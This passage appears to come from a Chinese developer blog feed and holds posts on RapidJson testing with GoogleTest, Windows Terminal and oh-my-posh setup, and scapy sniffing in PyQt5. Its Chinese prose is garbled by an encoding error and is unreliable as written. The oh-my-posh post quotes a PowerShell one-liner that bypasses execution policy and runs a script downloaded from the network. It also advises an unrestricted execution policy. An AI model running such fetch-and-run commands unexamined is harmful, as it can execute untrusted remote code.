doc.GetAllocator(); Value memKey(key.c_str(), allocator); Value memVal(value, allocator); doc.AddMember(memKey, memVal, allocator); return true; } bool JsonObj::PrintJsonStr() { if (!doc.IsObject()) { return false; } StringBuffer buffer; // Writer\u0026lt;StringBuffer\u0026gt; writer(buffer); PrettyWriter\u0026lt;StringBuffer\u0026gt; writer(buffer); doc.Accept(writer); std::cout \u0026lt;\u0026lt; buffer.GetString() \u0026lt;\u0026lt; std::endl; return true; } class RapidJsonTest : public testing::Test { protected: void SetUp() override {} void TearDown() override {} }; TEST_F(RapidJsonTest, TestValidation) { JsonObj obj; Document doc; auto allocator = doc.GetAllocator(); bool res; res = obj.AddMember\u0026lt;std::string\u0026gt;(\u0026#34;app_id\u0026#34;, \u0026#34;00\u0026#34;); EXPECT_TRUE(res); res = obj.AddMember\u0026lt;std::string\u0026gt;(\u0026#34;func\u0026#34;, \u0026#34;import\u0026#34;); EXPECT_TRUE(res); res = obj.AddMember\u0026lt;int\u0026gt;(\u0026#34;num\u0026#34;, 100); EXPECT_TRUE(res); Value vArray(kArrayType); for (int i = 0; i \u0026lt; 3; ++i) { Value tmp(kObjectType); tmp.AddMember(\u0026#34;m4\u0026#34;, i, allocator); tmp.AddMember(\u0026#34;m5\u0026#34;, i + 10, allocator); vArray.PushBack(tmp, allocator); } res = obj.AddMember\u0026lt;Value\u0026gt;(\u0026#34;obj_list\u0026#34;, vArray); EXPECT_TRUE(res); obj.PrintJsonStr(); } int main() { testing::InitGoogleTest(); return RUN_ALL_TESTS(); } } albusguo@AlbusGuo-PC:/mnt/d/Scripts/CPPScripts/RapidJson/build$ ./test_rapid_json Running main() from /mnt/d/Scripts/CPPScripts/RapidJson/third/googletest/src/gtest_main.cc [==========] Running 1 test from 1 test suite. [----------] Global test environment set-up. [----------] 1 test from RapidJsonTest [ RUN ] RapidJsonTest.TestValidation { \u0026#34;app_id\u0026#34;: \u0026#34;00\u0026#34;, \u0026#34;func\u0026#34;: \u0026#34;import\u0026#34;, \u0026#34;num\u0026#34;: 100, \u0026#34;obj_list\u0026#34;: [ { \u0026#34;m4\u0026#34;: 0, \u0026#34;m5\u0026#34;: 10 }, { \u0026#34;m4\u0026#34;: 1, \u0026#34;m5\u0026#34;: 11 }, { \u0026#34;m4\u0026#34;: 2, \u0026#34;m5\u0026#34;: 12 } ] } [ OK ] RapidJsonTest.TestValidation (0 ms) [----------] 1 test from RapidJsonTest (0 ms total) [----------] Global test environment tear-down [==========] 1 test from 1 test suite ran. (0 ms total) [ PASSED ] 1 test. åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œå¯¹ Object é¢å¤–å°è£…äº†ä¸€ä¸ªæ¨¡æ¿æˆå‘˜å‡½æ•° AddMember æ¥æ·»åŠ JSONé”®å€¼ï¼Œä½†å®é™…æ“ä½œèµ·æ¥ä¹‹åå‘ç°RapidJsonåœ¨åˆ›å»º Value çš„æ—¶å€™å±…ç„¶è¦å¯¹ std::string ã€ int/bool ã€Array ç­‰è¿›è¡Œä¸åŒçš„æ“ä½œï¼Œç®€ç›´æ˜¯é€†å¤©ï¼Œæå¾—æˆ‘ç‰¹åŒ–äº†ä¸‰å››ç§æ¨¡æ¿ï¼ŒåŸºæœ¬ç­‰äºé‡è½½ (lllï¿¢Ï‰ï¿¢) ã€‚\nä¸è¿‡è€ƒè™‘åˆ°æ˜å¤©ä¸Šç­å¯èƒ½è¿˜éœ€è¦å†å‚è€ƒä¸€ä¸‹ä»Šå¤©å†™å‡ºæ¥çš„ä»£ç ï¼Œå°±å…ˆæ”¾åˆ°åšå®¢ä¸Šå§ï¼Œè¿™éƒ¨åˆ†æœ‰ä¸€ç‚¹ç‚¹çƒ‚å°¾ï¼Œè§è°…ã€‚\nç•ªå¤–ï¼šRapidJson In GTest åœ¨ å¼€å‘è€…æµ‹è¯• çš„æ¦‚å¿µä¸­ï¼Œç¼–ç æ—¶ä¸ä»…è¦å®ç°ä¸šåŠ¡åŠŸèƒ½ï¼Œè¿˜è¦ç¼–å†™æœ‰ç›¸åº”çš„æµ‹è¯•ç”¨ä¾‹ã€‚GTest å°±æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æµ‹è¯•æ¡†æ¶ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿåœ°å®Œæˆç”¨ä¾‹ç¼–å†™ã€‚\nå¯ä»¥ç›´æ¥æŠŠæºç æ‹‰ä¸‹æ¥ï¼Œç„¶åæŠŠä»“åº“ä¸­ googletest æ–‡ä»¶å¤¹å¤åˆ¶åˆ°cmakeé¡¹ç›®ä¸­çš„ä»»æ„ä½ç½®ã€‚\nåœ¨æ ¹ç›®å½•çš„ CMakeLists.txt ä¸­æŠŠGTestæºç åŒ…å«è¿›é¡¹ç›®ä¸­ï¼š\nPROJECT(TRY_RAPID_JSON) # GoogleTest requires at least C++14 set(CMAKE_CXX_STANDARD 14) set(GOOGLETEST_VERSION 1.12.1) ADD_SUBDIRECTORY(third/googletest .) ADD_SUBDIRECTORY(src .) åœ¨æºç ç›®å½•çš„ CMakeLists.txt ä¸­æŠŠGTeståº“è¿æ¥åˆ°æˆ‘ä»¬çš„ç¨‹åºé‡Œï¼š\nPROJECT(TRY_RAPID_JSON) INCLUDE_DIRECTORIES(../include) ADD_EXECUTABLE(test_rapid_json main.cpp) TARGET_LINK_LIBRARIES( test_rapid_json GTest::gtest_main ) ä¹‹åå°±å¯ä»¥æ„‰å¿«åœ°ä½¿ç”¨GTestäº†ã€‚\nå¯¹äºVSCodeçš„å¤´æ–‡ä»¶çš„åŒ…å«ï¼Œå¯ä»¥å‚è€ƒ Step 1.2 VSCode install ï¼Œä¸è¿‡ä¸€é”®è¿è¡Œæˆ‘æ²¡æœ‰é…ç½®ï¼Œç›®å‰è¿˜æ˜¯æœ‰bugçš„ã€‚\nåœ¨ main.cpp é‡Œé¢ç¼–å†™æµ‹è¯•ç”¨ä¾‹ï¼š\n#include \u0026lt;rapidjson/document.h\u0026gt; #include \u0026#34;gtest/gtest.h\u0026#34; #include \u0026lt;map\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;functional\u0026gt; #include \u0026lt;vector\u0026gt; using namespace rapidjson; namespace { class JsonObj { public: explicit JsonObj(const char *jsonStr) { if (doc.Parse(jsonStr).HasParseError()) { doc = NULL; } } bool IsNullDoc() { return doc.IsNull(); } bool Validation(const std::map\u0026lt;std::string, std::string\u0026gt; valid) const; private: Document doc; std::vector\u0026lt;std::string\u0026gt; kTypeNames = { \u0026#34;Null\u0026#34;, \u0026#34;False\u0026#34;, \u0026#34;True\u0026#34;, \u0026#34;Object\u0026#34;, \u0026#34;Array\u0026#34;, \u0026#34;String\u0026#34;, \u0026#34;Number\u0026#34; }; }; bool JsonObj::Validation(const std::map\u0026lt;std::string, std::string\u0026gt; valid) const { if (doc.IsNull()) { return false; } if (valid.size() == 0) { return true; } for (auto iter : valid) { if (doc.HasMember(iter.first.c_str())) { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; passed existance check.\\n\u0026#34;; } else { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; failed existance check.\\n\u0026#34;; return false; } auto typeId = doc[iter.first.c_str()].GetType(); if (kTypeNames[typeId] == iter.second) { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; passed type check.\u0026#34; \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; failed type check.\\n\u0026#34;; std::cout \u0026lt;\u0026lt; \u0026#34;real type: \u0026#34; \u0026lt;\u0026lt; kTypeNames[typeId] \u0026lt;\u0026lt; std::endl; return false; } } return true; } class RapidJsonTest : public testing::Test { protected: void SetUp() override { jsonStr = \u0026#34;{\\n\u0026#34; \u0026#34; \\\u0026#34;m1\\\u0026#34;: \\\u0026#34;ab123\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m2\\\u0026#34;: \\\u0026#34;1234567675\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m3\\\u0026#34;: \\\u0026#34;sdasdqwsad\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;list\\\u0026#34;: [\\n\u0026#34; \u0026#34; {\\n\u0026#34; \u0026#34; \\\u0026#34;afafa\\\u0026#34;: \\\u0026#34;alkkk\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;abcdf\\\u0026#34;: \\\u0026#34;asdqw\\\u0026#34;\\n\u0026#34; \u0026#34; }\\n\u0026#34; \u0026#34; ]\\n\u0026#34; \u0026#34;}\u0026#34;; invalidJsonStr = \u0026#34;{\\n\u0026#34; \u0026#34; \\\u0026#34;m1\\\u0026#34;: \\\u0026#34;afcdeb1238\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m2\\\u0026#34;: \\\u0026#34;1234567675\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m3\\\u0026#34;: \\\u0026#34;sdasdqwsad\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;list\\\u0026#34;: [\\n\u0026#34; \u0026#34;}\u0026#34;; } std::string jsonStr; std::string invalidJsonStr; }; TEST_F(RapidJsonTest, TestValidation) { // std::cout \u0026lt;\u0026lt; jsonStr \u0026lt;\u0026lt; std::endl; JsonObj jobj(jsonStr.c_str()); JsonObj invalidJobj(invalidJsonStr.c_str()); std::map\u0026lt;std::string, std::string\u0026gt; valid = { {\u0026#34;m1\u0026#34;, \u0026#34;String\u0026#34;}, {\u0026#34;m2\u0026#34;, \u0026#34;String\u0026#34;}, {\u0026#34;list\u0026#34;, \u0026#34;Array\u0026#34;} }; EXPECT_FALSE(jobj.IsNullDoc()); EXPECT_TRUE(jobj.Validation(valid)); EXPECT_TRUE(invalidJobj.IsNullDoc()); EXPECT_FALSE(invalidJobj.Validation(valid)); } int main() { testing::InitGoogleTest(); return RUN_ALL_TESTS(); } } albusguo@AlbusGuo-PC:/mnt/d/Scripts/CPPScripts/RapidJson/build$ ./test_rapid_json Running main() from /mnt/d/Scripts/CPPScripts/RapidJson/third/googletest/src/gtest_main.cc [==========] Running 1 test from 1 test suite. [----------] Global test environment set-up. [----------] 1 test from RapidJsonTest [ RUN ] RapidJsonTest.TestValidation list passed existance check. list passed type check. m1 passed existance check. m1 passed type check. m2 passed existance check. m2 passed type check. [ OK ] RapidJsonTest.TestValidation (0 ms) [----------] 1 test from RapidJsonTest (0 ms total) [----------] Global test environment tear-down [==========] 1 test from 1 test suite ran. (0 ms total) [ PASSED ] 1 test. å°±å¯ä»¥å®Œæˆå‡½æ•°çš„ç®€å•æµ‹è¯•ã€‚\n","date":"2022-09-18T00:00:00Z","permalink":"https://xrg.fj.cn/p/rapidjson%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/","title":"RapidJsonä½¿ç”¨å°è®°"},{"content":"èƒŒæ™¯ è¿‘æ¥å‘ç°å·¥ä½œ \u0026amp; ç”Ÿæ´»çš„æ—¶å€™è·ŸWindows Terminalæ‰“çš„äº¤é“è›®å¤šçš„ï¼Œä½†æ¯æ¯æ‰“å¼€å®ƒéƒ½çœ¼å‰ä¸€é»‘ï¼š\nWidows terminal äºæ˜¯å†³å®šå¯¹å®ƒè¿›è¡Œä¸€äº›ç®€å•çš„ç¾åŒ–ï¼Œè®©è¿™äº›å°ç»†èŠ‚ç»™è‡ªå·±çš„å¿ƒæƒ…å¢åŠ ç‚¹é¢œè‰² (â—\u0026rsquo;â—¡\u0026rsquo;â—)\nStep 1 background å¯¹äºä¸€ä¸ªåˆå¤§åˆé»‘çš„ç»ˆç«¯æ¥è¯´ï¼Œä¸€ä¸ªéå¸¸æ˜¾è‘—çš„æå‡é¢œå€¼çš„åŠæ³•å°±æ˜¯æ¢ä¸Šä¸€å¼ è‡ªå·±æ»¡æ„çš„èƒŒæ™¯å›¾ç‰‡ã€‚\nç‚¹å‡»Windows Terminalé¡¶æ çš„å°å€’ä¸‰è§’ï¼Œè¿›å…¥ã€è®¾ç½®ã€‘â€”â€”ã€Windows Powershellã€‘â€”â€”ã€å¤–è§‚ã€‘â€”â€”ã€èƒŒæ™¯å›¾ç‰‡ã€‘ï¼Œé€‰æ‹©å›¾ç‰‡è·¯å¾„å³å¯ã€‚\nå†å¾®è°ƒä¸€ä¸‹é€æ˜åº¦ï¼Œæ•´ä¸ªè´¨æ„Ÿä¼šé©¬ä¸Šæé«˜ï¼š\nbackground image å®¡ç¾å„å¼‚ï¼Œå‹¿æ ã€‚\nStep 2 å®‰è£…oh-my-posh oh-my-posh æ˜¯ä¸€ä¸ªç»ˆç«¯ç¾åŒ–ç¨‹åºï¼Œç±»ä¼¼MacOSç»ˆç«¯ç¾åŒ–å¸¸ç”¨çš„zshã€‚\nå»ºè®® ä¸è¦ä½¿ç”¨ å®˜ç½‘ä»‹ç»çš„ä¸‹è½½åŠæ³•ï¼š\n# é”™è¯¯æ¡ˆä¾‹ï¼š # winget winget install JanDeDobbeleer.OhMyPosh -s winget #scoop scoop install https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/oh-my-posh.json # manual Set-ExecutionPolicy Bypass -Scope Process -Force; Invoke-Expression ((New-Object System.Net.WebClient).DownloadString(\u0026#39;https://ohmyposh.dev/install.ps1\u0026#39;)) å®Œå…¨ä¸ç†è§£ä¸ºä»€ä¹ˆåœ¨å®˜ç½‘ä¸Šè¦æœ‰è¿™ä¹ˆæŒ«çš„ä¸‹è½½æ–¹å¼ï¼Œå®ƒæ˜æ˜å°±æœ‰å®‰è£…ç¨‹åºâ€¦â€¦å›½å†…ä¼™ä¼´ç”¨è¿™ä¸ªåŠæ³•å»ä¸‹è½½çš„æ—¶å€™ï¼Œåªèƒ½è¯´ç”Ÿæ­»ç”±å‘½ï¼Œç”¨äº†æ¢¯å­ä¹Ÿä¸è¡Œï¼Œè¿˜å¾—ä¸ºç»ˆç«¯é…ç½®ä»£ç†ï¼Œå±äºæ˜¯æ²¡æœ‰æ„ä¹‰çš„æ­¥éª¤ã€‚\nå¯ä»¥æ‰‹åŠ¨ä¸‹è½½ä¸Šè¿°å‘½ä»¤ä¸­æåˆ°çš„å®‰è£…è„šæœ¬ https://ohmyposh.dev/install.ps1 ï¼Œçœ‹ä¸€çœ¼å°±çŸ¥é“å®é™…ä¸Šå®ƒå°±æ˜¯åˆ° Github release ä¸ŠæŠŠå®‰è£…ç¨‹åºä¸‹è½½ä¸‹æ¥è€Œå·²ï¼Œä¸æ˜¯å¾ˆç†è§£ä¸ºä»€ä¹ˆè¦ç”¨æˆ·ç”¨ä¸€ä¸ªåäººç±»çš„å‘½ä»¤å®‰è£…ã€‚\nå› æ­¤ï¼Œæˆ‘ä»¬ç›´æ¥æŠŠå¯¹åº”çš„ installer ä¸‹åˆ°æœ¬åœ°ï¼ˆè®¿é—®GitHubçš„æ—¶å€™å¯ä»¥ç§‘å­¦ä¸Šç½‘ï¼Œæˆ–ä½¿ç”¨giteeé•œåƒï¼‰ï¼Œè¿è¡Œï¼Œå³å¯å®Œæˆ oh-my-posh çš„å®‰è£…ã€‚\nStep 3 ä¸‹è½½å­—ä½“ oh-my-posh åŸºäº Nerd Fonts å¼€å‘ï¼Œå› æ­¤åœ¨ä½¿ç”¨å®ƒä¹‹å‰æˆ‘ä»¬è¦å…ˆå®‰è£…å­—ä½“ï¼Œä»¥ä¾¿æ­£ç¡®æ˜¾ç¤ºç‰¹æ®Šå­—ç¬¦ã€‚\nåˆ° å­—ä½“ä¸‹è½½ ç•Œé¢éšä¾¿æ‰¾ä¸€ä¸ªè‡ªå·±æ»¡æ„çš„å­—ä½“ï¼Œä¸‹è½½åˆ°æœ¬åœ°è§£å‹ï¼Œé€‰ä¸­æ‰€æœ‰æ–‡ä»¶å³é”®ç‚¹å‡»å®‰è£…å³å¯ã€‚\næ³¨æ„ è¦åˆ°Windows Terminalè®¾ç½®ç•Œé¢ï¼Œè¿›å…¥åˆ° Step 1 è®¾ç½®èƒŒæ™¯å›¾ç‰‡çš„åœ°æ–¹ï¼Œè®¾ç½®æ˜¾ç¤ºå­—ä½“ã€‚\nStep 4 é…ç½®powershellå¯åŠ¨é¡¹ ä¸‡äº‹ä¿±å¤‡ï¼Œæ¥ä¸‹æ¥é…ç½® powershell çš„å¯åŠ¨é¡¹ï¼Œæ¥ä½¿æ¯æ¬¡æ‰“å¼€å®ƒçš„æ—¶å€™éƒ½è‡ªåŠ¨è¿è¡Œ oh-my-posh ã€‚\né¦–å…ˆ ä½¿ç”¨å‘½ä»¤ Set-ExecutionPolicy Unrestricted è§£é™¤è„šæœ¬è¿è¡Œé™åˆ¶ï¼Œå¦åˆ™æ— æ³•åœ¨å¯åŠ¨æ—¶æ‰§è¡Œ oh-my-posh ã€‚\næ¥ç€ä½¿ç”¨å‘½ä»¤ echo $PROFILE çœ‹ä¸€ä¸‹è‡ªå·±ç³»ç»Ÿä¸Š powershell å¯åŠ¨é¡¹æ–‡ä»¶çš„è·¯å¾„ï¼Œå¦‚æœç³»ç»Ÿä¸Šä¸å­˜åœ¨è¿™ä¸ªæ–‡ä»¶çš„è¯å¯ä»¥æ–°å»ºä¸€ä¸ªã€‚\nPS C:\\Users\\10924\u0026gt; echo $PROFILE C:\\Users\\10924\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1 # å¦‚æœæ–‡ä»¶ç®¡ç†å™¨æ‰¾ä¸åˆ°è¿™ä¸ªè·¯å¾„å¯ä»¥æ–°å»º # New-Item -Path $PROFILE -Type File -Force ç”¨ notepad æˆ–å…¶ä»–ä»»ä½•ç¼–è¾‘å™¨åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œå†™ä¸Šï¼š\noh-my-posh init pwsh [--config] [ä¸»é¢˜è·¯å¾„] | Invoke-Expression ä¿å­˜ï¼Œé‡å¯ powershell å³å¯ã€‚\npowershell åœ¨ä¸Šé¢çš„å‘½ä»¤ä¸­ï¼Œ --config [path] æ˜¯å¯é€‰é¡¹ï¼Œä½†å…¶å®æœ€å¥½æ˜¯è¦å†™ä¸Šï¼Œå¦åˆ™ oh-my-posh æ¯æ¬¡è¿è¡Œçš„æ—¶å€™ï¼ˆå¯åŠ¨å’Œä¸¤æ¡å‘½ä»¤ä¹‹é—´ï¼‰éƒ½ä¼šä»ç½‘ç»œä¸Šä¸‹è½½ä¸»é¢˜æ–‡ä»¶ï¼Œä¼šå¸¦æ¥è‹¥å¹²ç§’çš„æ—¶å»¶ï¼Œè¿™å¯¹äºä¸€ä¸ªç»ˆç«¯æ¥è¯´ç®€ç›´æ˜¯ç‚¸è£‚ã€‚\nå¯ä»¥ä½¿ç”¨ Get-PoshThemes è·å–æ‰€æœ‰ä¸»é¢˜ï¼Œæ‰¾åˆ°è‡ªå·±æ»¡æ„çš„ä¸»é¢˜å®Œæˆè®¾ç½®å³å¯ã€‚æˆ‘å›¾ä¸­çš„ä¸»é¢˜æ˜¯ clean-detailed ï¼Œå…¶å®ä¸ªäººè§‰å¾—è§‚æ„Ÿä¸€èˆ¬ï¼Œåªèƒ½è¯´èŠèƒœäºæ— ã€‚\nStep 5 WSL WSLå…¶å®ä¹Ÿå¯ä»¥ä»Windows Terminalå¯åŠ¨ï¼š\nWSL in Windows Terminal ä¹Ÿå› æ­¤ï¼Œå¯ä»¥é€šè¿‡ç±»ä¼¼çš„åŠæ³•å¯¹WSLç»ˆç«¯è¿›è¡Œç¾åŒ–ã€‚\nè®¾ç½®èƒŒæ™¯å›¾ç‰‡å’Œå­—ä½“å°±ç•¥è¿‡ï¼Œè¿™é‡Œç®€å•è¯´ä¸€ä¸‹å¦‚ä½•åœ¨WSLä¸­ä½¿ç”¨ oh-my-posh ï¼Œå…¶å®åŸºæœ¬ä¸Šæ˜¯æ¬è¿ å®˜æ–¹æ–‡æ¡£ ã€‚\nStep 5.1 posh-linux å®˜æ–¹æä¾›çš„å‘½ä»¤å¦‚ä¸‹ï¼š\nsudo wget https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/posh-linux-amd64 -O /usr/local/bin/oh-my-posh sudo chmod +x /usr/local/bin/oh-my-posh å…¶å®å°±æ˜¯å» è¿™ä¸ªé“¾æ¥ æŠŠLinuxç‰ˆæœ¬çš„ oh-my-posh ä¸‹è½½ä¸‹æ¥ï¼Œæ”¾åˆ° /usr/local/bin è·¯å¾„ä¸‹ã€‚\nStep 5.2 themes å®˜æ–¹æä¾›çš„å‘½ä»¤å¦‚ä¸‹ï¼š\nmkdir ~/.poshthemes wget https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/themes.zip -O ~/.poshthemes/themes.zip unzip ~/.poshthemes/themes.zip -d ~/.poshthemes chmod u+rw ~/.poshthemes/*.omp.* rm ~/.poshthemes/themes.zip å…¶å®å°±æ˜¯å» è¿™ä¸ªé“¾æ¥ ä¸‹è½½ä¸»é¢˜åŒ…ï¼Œè§£å‹åˆ°è‡ªå·±åˆ›å»ºçš„ä¸€ä¸ªè·¯å¾„å†…ã€‚\nè¿™ä¸€æ­¥å’Œä¸Šä¸€æ­¥ï¼Œéƒ½å¯ä»¥åœ¨Windowsç³»ç»Ÿä¸Šæ‰‹åŠ¨æ‰§è¡Œä¸‹è½½ï¼Œä¸ç„¶åŒæ ·å¯èƒ½é‡åˆ°ç»ˆç«¯è®¿é—®ä¸äº†GitHubçš„æƒ…å†µã€‚\nStep 5.3 é…ç½®å¯åŠ¨é¡¹ ç±»ä¼¼ powershell ï¼ŒWSLä¸­çš„ bash ä¹Ÿæœ‰å¯åŠ¨é¡¹ï¼Œå¯ä»¥çœ‹æƒ…å†µé€‰æ‹© ~/.profile ã€ ~/.bashrc ã€ ~/.bash_profile å…¶ä¸­çš„ä¸€ä¸ªï¼Œæˆ‘ä»¥ ~/.profile æ–‡ä»¶ä¸ºä¾‹ï¼Œåœ¨æ–‡ä»¶æœ«å°¾åŠ ä¸Šï¼š\neval \u0026#34;$([program-name] init bash --config \u0026#39;~/.poshthemes/clean-detailed.omp.json\u0026#39;)\u0026#34; å³å¯å®Œæˆé…ç½®ã€‚\næ³¨æ„é…ç½®å½“ä¸­çš„ [program-name] ï¼Œè¦å†™ Step 5.1 é‡Œé¢æ”¾åˆ° /usr/local/bin å½“ä¸­çš„ç¨‹åºåï¼Œä¸è¦å†™é”™ã€‚\nè‡³æ­¤ï¼Œæˆ‘ä»¬åœ¨WSLå’Œpowershellä¸Šéƒ½å®Œæˆäº†ç¾åŒ–æ“ä½œã€‚\nWSL ","date":"2022-09-17T00:00:00Z","permalink":"https://xrg.fj.cn/p/windows-terminal%E7%BE%8E%E5%8C%96%E5%B0%8F%E8%AE%B0/","title":"Windows Terminalç¾åŒ–å°è®°"},{"content":"PyQt5åˆæ¢ è‡ªè¯»ä¹¦æ‘˜æŠ„ç«™ç‚¹æ„å»ºå®Œæˆä»¥æ¥ï¼Œä¸€ç›´æ²¡æœ‰è¿›è¡Œä»€ä¹ˆæœ‰è¶£çš„å®è·µï¼Œè¿™å›ç”±äºæ¯•è®¾çš„éœ€è¦ï¼Œé¦–æ¬¡å°è¯•è¿›è¡ŒGUIç¼–ç¨‹ï¼›æ­¤å¤–åŒæ ·ç”±äºæ¯•è®¾éœ€è¦ï¼Œä½¿ç”¨äº†scapyè¿›è¡Œæµé‡å—…æ¢ï¼Œå› æ­¤å°±æœ‰äº†è¿™ä¸€ç¯‡å››ä¸åƒçš„è®°å½•æ€§è´¨çš„æ–‡ç« ã€‚\nQtï¼ˆéŸ³ cute ï¼‰æ˜¯ä¸€å¥—è¢«å¹¿æ³›ä½¿ç”¨çš„GUIç»„ä»¶åº“ï¼Œè€Œ PyQt åˆ™æ˜¯è¿™å¥—æ¡†æ¶ä¸Pythonè¯­è¨€çš„ç»“åˆï¼Œæ˜¯Pythonä¸­æœ€å¼ºå¤§çš„GUIåº“ä¹‹ä¸€ã€‚\næœ¬æ¬¡é€‰ç”¨è¿™ä¸ªæ¡†æ¶å…¶å®ç»è¿‡äº†ä¸€å®šçš„æ›²æŠ˜ï¼Œå› ä¸ºPythonçš„GUIåº“æœ‰å¤ªå¤šäº†ğŸ¤£\nTkInter ï¼špythonæ ‡å‡†Tk GUIå·¥å…·åŒ…çš„æ¥å£ï¼Œæˆ‘å¯¹è¿™ä¸ªåº“å€’æ²¡ä»€ä¹ˆæˆè§ï¼Œä»¥å‰çš„é¡¹ç›®ä½¿ç”¨è¿‡ï¼ˆè™½ç„¶æ˜¯é˜Ÿå‹åšçš„ï¼‰ï¼Œè¿™æ¬¡æƒ³æ¢ä¸ªåˆ«çš„åº“ã€‚\nPySimpleGUI ï¼šæ¡†æ¶ä¸»æ‰“ä¸€ä¸ªç®€å•æ˜“ç”¨ï¼Œä¹Ÿæ˜¯æˆ‘æœ€åˆé€‰ç”¨çš„æ–¹æ¡ˆï¼›æ¥è§¦äº†åŠä¸ªå¤šå°æ—¶ä¹‹åæ”¾å¼ƒï¼Œæ–‡æ¡£å±å®å†™å¾—åƒğŸ’©ã€‚\nKivy ï¼šè¿™ä¸ªåº“è‡ªå·±è¿˜å¼€å‘äº†ä¸€å¥—è®¾è®¡è¯­è¨€ï¼Œç•Œé¢æ–‡ä»¶å’Œç¨‹åºæ–‡ä»¶åˆ†ç¦»ï¼Œä½†åªæœ‰è‹±æ–‡æ–‡æ¡£ä¸”æ¡†æ¶æœ¬èº«å¯¹ä¸­æ–‡æ”¯æŒä¸å¥½ï¼Œæ¥è§¦äº†åŠä¸ªå¤šå°æ—¶åæ”¾å¼ƒã€‚\nPyQt ï¼šä»¥ä¸Šæ‰€æœ‰åº“æ”¾çš„éƒ½æ˜¯å®˜æ–¹é“¾æ¥ï¼Œå”¯ç‹¬è¿™é‡Œæ”¾çš„æ˜¯ä¸€ç¯‡ä¸­æ–‡æ•™ç¨‹ï¼Œä¸ªäººè§‰å¾—è¿™ä½å¤§ä½¬ç¿»è¯‘å¾—ä¸é”™ï¼Œæ–‡æ¡£å­¦èµ·æ¥æ˜¯æ¯”è¾ƒèˆ’æœçš„ï¼Œé‚é‡‡ç”¨ã€‚\nå®‰è£…PyQtéå¸¸ç®€å•ï¼š\npip install PyQt5 pip install pyqt5-tools è¿˜æœ‰ç®€å•æ˜“ç”¨çš„ Qt Designer ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡æ‹–æ‹½çš„æ–¹å¼æ¥æ”¾ç½®æ§ä»¶ã€è®¾è®¡é¡µé¢ï¼Œç‰›é€¼æ ¼æ‹‰æ–¯ï¼Œä½†æˆ‘å‡†å¤‡æ‰‹æ’¸ä»£ç ï¼Œå› æ­¤æ²¡æœ‰å°è¯•å¯¹å®ƒè¿›è¡Œé…ç½®ã€‚\nç¯å¢ƒå®‰è£…å®Œæˆä¹‹åï¼Œå¯ä»¥ç…§ç€ æ•™ç¨‹ å®ç°ä¸€äº›åŠŸèƒ½ã€‚\nç»è¿‡ä¸€ç³»åˆ—çš„æ¢ç´¢ï¼Œæˆ‘çš„ç¨‹åºåˆå…·é›å½¢ï¼š\nç•Œé¢æœ‰å¦‚ä¸‹å‡ ä¸ªç»„ä»¶ï¼š\nåœ¨çº¿åˆ†æï¼šå¯åŠ¨åœ¨çº¿æµé‡åˆ†æã€‚ç›®å‰è¿˜æ²¡æœ‰åŠ å…¥â€œåˆ†æâ€çš„åŠŸèƒ½ï¼Œä»…èƒ½å¯¹æµé‡è¿›è¡Œå®æ—¶æ•æ‰ã€‚\nç»“æŸåœ¨çº¿åˆ†æï¼šé¡¾åæ€ä¹‰ã€‚\næ‰“å¼€æ–‡ä»¶ï¼šæ‰“å¼€ä¸€ä¸ª pcap æ–‡ä»¶ï¼Œç•™å¾…åç»­ä½¿ç”¨ï¼Œä¸»è¦å¸Œæœ›å°†ç¦»çº¿åˆ†æçš„åŠŸèƒ½ä¹Ÿæ•´åˆè¿›æ¥ã€‚\nå¤§å¤§çš„æ–‡æœ¬æ¡†ï¼šç”¨äºè¾“å‡ºå®æ—¶æµé‡æ•æ‰çš„å†…å®¹ã€‚\nè¿è¡Œèµ·æ¥çš„æ•ˆæœå¦‚ä¸‹ï¼š\nåœ¨çº¿åˆ†æï¼ˆåˆæ­¥ï¼‰ æ€»ä½“å®ç°çš„å†…å®¹æ¯”è¾ƒç®€å•ï¼Œå› æ­¤åæ–‡ä»…å¯¹æˆ‘å¼€å‘è¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€äº›ç–‘éš¾æ‚ç—‡è¿›è¡Œå™è¿°ã€‚\nä¸è¿‡ï¼Œè¿˜æ˜¯éœ€è¦å…ˆå¯¹æœ¬æ–‡çš„å¦ä¸€ä¸ªä¸»è§’ scapy è¿›è¡Œä¸€äº›ä»‹ç»ã€‚\nscapyåˆæ¢ Scapy æ˜¯ä¸€å¥—å®Œæ•´çš„ç½‘ç»œæŠ¥æ–‡æ“ä½œå·¥å…·ï¼Œå¯ä»¥å®ç°æŠ“åŒ…ã€è§£åŒ…ã€æ„é€ å’Œå‘é€æ•°æ®åŒ…ç­‰åŠŸèƒ½ã€‚\nè¿™æ¬¡å°† scapy å’Œ PyQt5 ç»“åˆï¼Œå®é™…ä¸Šåªéœ€è¦ç”¨åˆ°æŠ“åŒ…çš„åŠŸèƒ½ï¼š\ndef StartSniff(self): self.stopSniff = False sniff(prn=self.SniffCallBack, count=0, stop_filter=self.isStop) def SniffCallBack(self, pkt: scapy.packet.Packet) -\u0026gt; None: \u0026#39;\u0026#39;\u0026#39; Do Something \u0026#39;\u0026#39;\u0026#39; def isStop(self, pkt): return self.stopSniff 